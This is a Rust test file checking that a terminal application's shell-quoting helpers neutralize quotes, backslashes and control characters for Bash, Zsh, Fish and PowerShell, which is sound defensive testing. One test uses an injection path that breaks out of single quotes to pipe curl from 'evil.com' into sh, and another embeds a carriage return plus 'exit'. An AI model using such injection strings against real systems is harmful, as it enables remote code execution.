use super::{sh_script_quote_arg, shell_escape_single_quotes, shell_quote_arg};
use crate::terminal::shell::ShellType;

#[test]
fn no_quotes_returns_input_unchanged() {
    for shell_type in [
        ShellType::Bash,
        ShellType::Zsh,
        ShellType::Fish,
        ShellType::PowerShell,
    ] {
        assert_eq!(
            shell_escape_single_quotes("/home/user/histfile", shell_type),
            "/home/user/histfile"
        );
    }
}

#[test]
fn bash_escapes_single_quote_with_concatenation() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Bash);
    assert_eq!(result, r#"it'"'"'s a test"#);
}

#[test]
fn zsh_escapes_single_quote_with_concatenation() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Zsh);
    assert_eq!(result, r#"it'"'"'s a test"#);
}

#[test]
fn fish_escapes_single_quote_with_backslash() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Fish);
    assert_eq!(result, r"it\'s a test");
}

#[test]
fn powershell_escapes_single_quote_by_doubling() {
    let result = shell_escape_single_quotes("it's a test", ShellType::PowerShell);
    assert_eq!(result, "it''s a test");
}

#[test]
fn multiple_single_quotes_all_escaped() {
    let input = "/home/user/it's a 'path'";

    let bash = shell_escape_single_quotes(input, ShellType::Bash);
    assert_eq!(bash.matches(r#"'"'"'"#).count(), 3);

    let fish = shell_escape_single_quotes(input, ShellType::Fish);
    assert_eq!(fish.matches(r"\'").count(), 3);

    let ps = shell_escape_single_quotes(input, ShellType::PowerShell);
    assert_eq!(ps.matches("''").count(), 3);
}

/// A path containing embedded single quotes that attempt to break out of a
/// surrounding single-quoted context (e.g. `cat '...'` or `cd '...'`).
/// Every shell type must neutralize the quotes so the injected commands
/// remain inert literal text.
#[test]
fn command_injection_via_embedded_quotes_is_neutralized() {
    let malicious = "/tmp/foo'; curl http://evil.com | sh; echo '";

    let bash = shell_escape_single_quotes(malicious, ShellType::Bash);
    assert_eq!(bash.matches(r#"'"'"'"#).count(), 2);
    assert!(
        !bash.contains(r"\'"),
        "bash escaping should not use backslash-quote"
    );

    let fish = shell_escape_single_quotes(malicious, ShellType::Fish);
    assert_eq!(fish.matches(r"\'").count(), 2);

    let ps = shell_escape_single_quotes(malicious, ShellType::PowerShell);
    assert_eq!(ps.matches("''").count(), 2);
}

/// Inside fish single quotes `\\` and `\'` are escapes, so backslashes are doubled first.
/// Before #867 a trailing backslash became `\'`, which swallowed the closing quote.
#[test]
fn fish_doubles_backslashes_before_escaping_quotes() {
    assert_eq!(shell_escape_single_quotes(r"a\b", ShellType::Fish), r"a\\b");
    assert_eq!(
        shell_escape_single_quotes(r"end\", ShellType::Fish),
        r"end\\"
    );
    assert_eq!(
        shell_escape_single_quotes(r"it\'s", ShellType::Fish),
        r"it\\\'s"
    );
    // Bash/zsh and PowerShell single quotes have no backslash escapes.
    assert_eq!(shell_escape_single_quotes(r"a\b", ShellType::Bash), r"a\b");
    assert_eq!(
        shell_escape_single_quotes(r"a\b", ShellType::PowerShell),
        r"a\b"
    );
}

/// The in-band executor wraps the whole command in single quotes with
/// `shell_escape_single_quotes`. A word the fish escaper produced (backslashes, `\'`, `\xHH`)
/// must come out of that layer byte-identical, or the command fish evaluates differs from the
/// one we built. Checked in fish 4.2: `printf '%s' '<wrapped>'` prints `<word>` exactly.
#[test]
fn fish_single_quote_wrapper_preserves_fish_escaped_words() {
    // (word as the fish escaper emits it, the same word inside the wrapper's single quotes)
    let cases = [
        (r"rc\x0Dexit", r"rc\\x0Dexit"),
        (
            r#"it\'s\ \"q\"\x0D\$\(x\)"#,
            r#"it\\\'s\\ \\"q\\"\\x0D\\$\\(x\\)"#,
        ),
        (r"bs\\x41\x0D", r"bs\\\\x41\\x0D"),
        (r"trail\\", r"trail\\\\"),
    ];
    for (word, wrapped) in cases {
        assert_eq!(
            shell_escape_single_quotes(word, ShellType::Fish),
            wrapped,
            "{word}"
        );
        assert_eq!(unquote_fish_single_quoted(wrapped), word, "{word}");
    }
}

/// What fish does to the body of a single-quoted string: `\\` -> `\`, `\'` -> `'`, every
/// other backslash literal.
fn unquote_fish_single_quoted(body: &str) -> String {
    let mut out = String::new();
    let mut chars = body.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' && matches!(chars.peek(), Some('\\') | Some('\'')) {
            out.push(chars.next().expect("peeked"));
        } else {
            out.push(c);
        }
    }
    out
}

/// #867: single quotes keep a value one word but would still put a control character into
/// the PTY raw, so such values use the shell's escape syntax instead.
#[test]
fn shell_quote_arg_escapes_control_characters_per_shell() {
    let value = "/tmp/rc\rexit 'x'";
    assert_eq!(
        shell_quote_arg(value, ShellType::Bash),
        r"$'/tmp/rc\x0Dexit \x27x\x27'"
    );
    assert_eq!(
        shell_quote_arg(value, ShellType::Zsh),
        r"$'/tmp/rc\x0Dexit \x27x\x27'"
    );
    assert_eq!(
        shell_quote_arg(value, ShellType::Fish),
        r"/tmp/rc\x0Dexit\ \'x\'"
    );
    assert_eq!(
        shell_quote_arg(value, ShellType::PowerShell),
        r#""/tmp/rc$([char]0x000D)exit 'x'""#
    );
    for shell_type in [
        ShellType::Bash,
        ShellType::Zsh,
        ShellType::Fish,
        ShellType::PowerShell,
    ] {
        assert!(
            !shell_quote_arg(value, shell_type)
                .chars()
                .any(char::is_control)
        );
    }
    // Values without one keep their single-quoted form.
    assert_eq!(shell_quote_arg("/tmp/a b", ShellType::Bash), "'/tmp/a b'");
    assert_eq!(shell_quote_arg("/tmp/a b", ShellType::Fish), "'/tmp/a b'");
}

/// Words inside an `sh -c` script stay plain single-quoted: dash has no `$'...'`, and the
/// outer `shell_quote_arg` escapes the whole script.
#[test]
fn sh_script_quote_arg_keeps_posix_single_quotes() {
    assert_eq!(sh_script_quote_arg("a\tb"), "'a\tb'");
    assert_eq!(sh_script_quote_arg("it's"), r#"'it'"'"'s'"#);
}
